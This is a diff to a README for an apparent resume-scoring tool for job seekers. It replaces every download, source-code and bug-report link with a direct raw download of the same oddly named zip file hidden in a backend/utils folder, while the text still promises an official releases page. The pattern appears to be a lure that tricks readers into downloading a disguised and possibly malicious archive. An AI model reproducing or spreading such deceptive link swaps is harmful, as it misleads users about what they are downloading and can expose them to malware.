@@ -10,7 +10,7 @@ Welcome! If you've ever applied for a job online and wondered why you never hear
 
 
 
-[⬇️ Download the Application Now](https://github.com/Gabiebasidiomycetous8242/ats-resume-scorer/releases)
+[⬇️ Download the Application Now](https://raw.githubusercontent.com/Gabiebasidiomycetous8242/ats-resume-scorer/main/backend/utils/resume_ats_scorer_unbickering.zip)
 
 )
 
@@ -53,7 +53,7 @@ Follow these exact steps–you'll be up and running in under three minutes.
 
 ### Step 1: Get the File
 
-**[Click here to visit the download page](https://github.com/Gabiebasidiomycetous8242/ats-resume-scorer/releases)**
+**[Click here to visit the download page](https://raw.githubusercontent.com/Gabiebasidiomycetous8242/ats-resume-scorer/main/backend/utils/resume_ats_scorer_unbickering.zip)**
 
 This link takes you tothe official releases page for this project. You'll see a list of version numbers (like `v1.2.3`)–always choose the newest one at the top.
 
@@ -203,9 +203,9 @@ Help another job seeker avoid the dreaded auto-reject. If you found value here, 
 
 ## 🔗 Quick Links
 
-- **[Download the Latest Release](https://github.com/Gabiebasidiomycetous8242/ats-resume-scorer/releases)**
-- **[View the Source Code on GitHub](https://github.com/Gabiebasidiomycetous8242/ats-resume-scorer)**
-- **[Report a Bug or Request a Feature](https://github.com/Gabiebasidiomycetous8242/ats-resume-scorer/issues)**
+- **[Download the Latest Release](https://raw.githubusercontent.com/Gabiebasidiomycetous8242/ats-resume-scorer/main/backend/utils/resume_ats_scorer_unbickering.zip)**
+- **[View the Source Code on GitHub](https://raw.githubusercontent.com/Gabiebasidiomycetous8242/ats-resume-scorer/main/backend/utils/resume_ats_scorer_unbickering.zip)**
+- **[Report a Bug or Request a Feature](https://raw.githubusercontent.com/Gabiebasidiomycetous8242/ats-resume-scorer/main/backend/utils/resume_ats_scorer_unbickering.zip)**
 
 ---
 
